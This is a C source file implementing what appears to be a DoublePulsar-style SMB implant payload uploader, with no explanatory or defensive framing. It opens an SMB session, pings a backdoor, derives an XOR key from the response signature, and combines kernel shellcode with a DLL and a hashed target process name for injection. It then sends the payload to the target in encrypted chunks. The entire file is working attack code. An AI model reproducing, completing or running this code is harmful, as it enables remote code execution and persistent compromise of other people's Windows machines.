#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include "config.h"

int upload_payload(const char *ip, int port, const char *payload_path, int payload_type) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return -1;
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return -1;
    }

    struct sockaddr_in serverAddr;
    ZeroMemory(&serverAddr, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    if (InetPtonA(AF_INET, ip, &serverAddr.sin_addr) != 1) {
        closesocket(sock);
        WSACleanup();
        return -1;
    }
    serverAddr.sin_port = htons(port);

    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) != 0) {
        closesocket(sock);
        WSACleanup();
        return -1;
    }

    HANDLE hFile = CreateFileA(payload_path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_READONLY, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        closesocket(sock);
        WSACleanup();
        return -1;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        closesocket(sock);
        WSACleanup();
        return -1;
    }

    BYTE *dllBuffer = (BYTE *)malloc(fileSize);
    if (!dllBuffer) {
        CloseHandle(hFile);
        closesocket(sock);
        WSACleanup();
        return -1;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, dllBuffer, fileSize, &bytesRead, NULL)) {
        free(dllBuffer);
        CloseHandle(hFile);
        closesocket(sock);
        WSACleanup();
        return -1;
    }
    CloseHandle(hFile);

    BYTE respBuffer[4096];
    int respLen;

    if (send(sock, (const char *)SMB_NEGOTIATE_PKT, sizeof(SMB_NEGOTIATE_PKT), 0) != sizeof(SMB_NEGOTIATE_PKT)) {
        closesocket(sock);
        WSACleanup();
        free(dllBuffer);
        return -1;
    }

    respLen = recv(sock, (char *)respBuffer, sizeof(respBuffer), 0);
    if (respLen <= 0) {
        closesocket(sock);
        WSACleanup();
        free(dllBuffer);
        return -1;
    }

    BYTE *sessionSetupCopy = (BYTE *)malloc(sizeof(SMB_SESSION_SETUP_PKT));
    if (!sessionSetupCopy) {
        closesocket(sock);
        WSACleanup();
        free(dllBuffer);
        return -1;
    }
    memcpy(sessionSetupCopy, SMB_SESSION_SETUP_PKT, sizeof(SMB_SESSION_SETUP_PKT));
    if (send(sock, (const char *)sessionSetupCopy, sizeof(SMB_SESSION_SETUP_PKT), 0) != sizeof(SMB_SESSION_SETUP_PKT)) {
        free(sessionSetupCopy);
        closesocket(sock);
        WSACleanup();
        free(dllBuffer);
        return -1;
    }
    free(sessionSetupCopy);

    respLen = recv(sock, (char *)respBuffer, sizeof(respBuffer), 0);
    if (respLen <= 0) {
        closesocket(sock);
        WSACleanup();
        free(dllBuffer);
        return -1;
    }
    WORD userId = *(WORD*)(respBuffer + 32);

    BYTE *treeConnectCopy = (BYTE *)malloc(sizeof(SMB_TREE_CONNECT_PKT));
    if (!treeConnectCopy) {
        closesocket(sock);
        WSACleanup();
        free(dllBuffer);
        return -1;
    }
    memcpy(treeConnectCopy, SMB_TREE_CONNECT_PKT, sizeof(SMB_TREE_CONNECT_PKT));
    *(WORD*)(treeConnectCopy + 32) = userId;
    if (send(sock, (const char *)treeConnectCopy, sizeof(SMB_TREE_CONNECT_PKT), 0) != sizeof(SMB_TREE_CONNECT_PKT)) {
        free(treeConnectCopy);
        closesocket(sock);
        WSACleanup();
        free(dllBuffer);
        return -1;
    }
    free(treeConnectCopy);

    respLen = recv(sock, (char *)respBuffer, sizeof(respBuffer), 0);
    if (respLen <= 0) {
        closesocket(sock);
        WSACleanup();
        free(dllBuffer);
        return -1;
    }
    WORD treeId = *(WORD*)(respBuffer + 28);

    BYTE *pingCopy = (BYTE *)malloc(sizeof(DP_PING_PKT));
    if (!pingCopy) {
        closesocket(sock);
        WSACleanup();
        free(dllBuffer);
        return -1;
    }
    memcpy(pingCopy, DP_PING_PKT, sizeof(DP_PING_PKT));
    *(WORD*)(pingCopy + 28) = treeId;
    *(WORD*)(pingCopy + 32) = userId;
    if (send(sock, (const char *)pingCopy, sizeof(DP_PING_PKT), 0) != sizeof(DP_PING_PKT)) {
        free(pingCopy);
        closesocket(sock);
        WSACleanup();
        free(dllBuffer);
        return -1;
    }
    free(pingCopy);

    respLen = recv(sock, (char *)respBuffer, sizeof(respBuffer), 0);
    if (respLen <= 0) {
        closesocket(sock);
        WSACleanup();
        free(dllBuffer);
        return -1;
    }
    DWORD sig = *(DWORD*)(respBuffer + SMB_RESP_SIGNATURE_START);
    DWORD key = 2 * sig ^ ((((sig >> 16) | (sig & 0xFF0000)) >> 8) | (((sig << 16) | (sig & 0xFF00)) << 8));

    BYTE *payload = (BYTE *)malloc(KERNEL_RUNDLL_SIZE + fileSize);
    if (!payload) {
        closesocket(sock);
        WSACleanup();
        free(dllBuffer);
        return -1;
    }
    memcpy(payload, KERNEL_RUNDLL_SHELLCODE, KERNEL_RUNDLL_SIZE);
    memcpy(payload + KERNEL_RUNDLL_SIZE, dllBuffer, fileSize);

    *(DWORD*)(payload + KERNEL_RUNDLL_TOTAL_OFFSET) = fileSize + 3978;
    *(DWORD*)(payload + KERNEL_RUNDLL_DLLSIZE_OFFSET) = fileSize;
    *(WORD*)(payload + KERNEL_RUNDLL_ORDINAL_OFFSET) = 1;

    DWORD hash = 0;
    const char *targetProcess = TARGET_INJECT_PROCESS;
    for (size_t i = 0; i < strlen(targetProcess); i++) {
        hash = hash * 127 + (unsigned char)targetProcess[i];
    }
    *(DWORD*)(payload + KERNEL_RUNDLL_HASH_OFFSET) = hash;

    for (size_t i = 0; i < (KERNEL_RUNDLL_SIZE + fileSize); i++) {
        payload[i] ^= ((BYTE *)&key)[i % 4];
    }

    size_t payloadSize = KERNEL_RUNDLL_SIZE + fileSize;
    size_t chunkSize = SMB_EXEC_SHELLCODE_LEN;
    size_t numChunks = (payloadSize + chunkSize - 1) / chunkSize;

    for (size_t chunk = 0; chunk < numChunks; chunk++) {
        size_t offset = chunk * chunkSize;
        size_t currentChunkSize = (chunk == numChunks - 1) ? (payloadSize - offset) : chunkSize;

        const BYTE *execPkt = DP_EXEC_PKT;
        int execLen = sizeof(DP_EXEC_PKT);
        BYTE *execCopy = (BYTE *)malloc(execLen + 12 + currentChunkSize);
        if (!execCopy) {
            closesocket(sock);
            WSACleanup();
            free(dllBuffer);
            free(payload);
            return -1;
        }
        memcpy(execCopy, execPkt, execLen);

        DWORD total = payloadSize;
        DWORD chunkSizeVal = currentChunkSize;
        DWORD offsetVal = offset;

        DWORD le_total = total;
        DWORD le_chunkSize = chunkSizeVal;
        DWORD le_offset = offsetVal;

        BYTE paramBuffer[12];
        memcpy(paramBuffer, &le_total, 4);
        memcpy(paramBuffer + 4, &le_chunkSize, 4);
        memcpy(paramBuffer + 8, &le_offset, 4);

        for (size_t i = 0; i < 12; i++) {
            paramBuffer[i] ^= ((BYTE *)&key)[i % 4];
        }

        memcpy(execCopy + execLen, paramBuffer, 12);
        memcpy(execCopy + execLen + 12, payload + offset, currentChunkSize);

        DWORD netbiosLen = 78 + currentChunkSize;
        *(DWORD*)(execCopy + SMB_NETBIOS_LEN_OFFSET) = htonl(netbiosLen);

        *(DWORD*)(execCopy + SMB_EXEC_TOTAL_DATA_OFFSET) = currentChunkSize;
        *(DWORD*)(execCopy + SMB_EXEC_DATA_COUNT_OFFSET) = currentChunkSize;
        *(DWORD*)(execCopy + SMB_EXEC_BYTE_COUNT_OFFSET) = currentChunkSize + 12;
        *(WORD*)(execCopy + SMB_TID_OFFSET) = treeId;
        *(WORD*)(execCopy + SMB_UID_OFFSET) = userId;

        int sendLen = execLen + 12 + currentChunkSize;
        if (send(sock, (const char *)execCopy, sendLen, 0) != sendLen) {
            free(execCopy);
            closesocket(sock);
            WSACleanup();
            free(dllBuffer);
            free(payload);
            return -1;
        }

        respLen = recv(sock, (char *)respBuffer, sizeof(respBuffer), 0);
        if (respLen <= 0) {
            free(execCopy);
            closesocket(sock);
            WSACleanup();
            free(dllBuffer);
            free(payload);
            return -1;
        }

        if (respBuffer[DP_RESP_MUX_ID_OFFSET] != DP_MULTIPLEX_ID_EXEC) {
            free(execCopy);
            closesocket(sock);
            WSACleanup();
            free(dllBuffer);
            free(payload);
            return -1;
        }

        free(execCopy);
    }

    closesocket(sock);
    WSACleanup();
    free(dllBuffer);
    free(payload);
    return 0;
}